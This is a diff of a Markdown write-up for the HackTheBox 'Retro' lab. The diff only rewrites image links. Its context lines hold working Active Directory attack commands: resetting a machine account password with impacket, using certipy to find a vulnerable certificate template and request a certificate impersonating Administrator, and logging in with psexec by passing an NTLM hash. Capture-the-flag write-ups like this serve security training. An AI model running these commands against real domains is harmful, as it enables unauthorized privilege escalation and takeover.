@@ -196,7 +196,7 @@ Change password
 ```
 ares@legion:~/HackTheBox/Retro$ impacket-changepasswd retro.vl/'banking$':banking@$target -newpass 'beer1!' -p rpc-samr
 ```
-![[Pasted image 20251125222237.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251125222237.png)
 
 Validate password change
 ```
@@ -218,7 +218,7 @@ ADCS        10.129.47.169   389    DC               Found CN: retro-DC-CA
 ```
 certipy-ad find -u 'banking$' -p 'beer1!' -dc-ip $target -vulnerable -stdout
 ```
-![[Pasted image 20251125223431.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251125223431.png)
 
 The CA Name , Template Name and the Minimum RSA Key Length from the Certipy output should be
 noted. Using these, a new certificate should be requested from the RetroClients template, impersonating
@@ -261,7 +261,7 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 certipy-ad req -u 'banking$' -p 'beer1!' -dc-ip $target -ca retro-DC-CA -template RetroClients -upn Administrator@retro.vl -sid S-1-5-21-2983547755-698260136-4283918172-500  -key-size 4096
 ```
 
-![[Pasted image 20251125225107.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251125225107.png)
 
 ```
 impacket-psexec retro.vl/Administrator@$target -hashes :252fac7066d93dd009d4fd2cd0368389
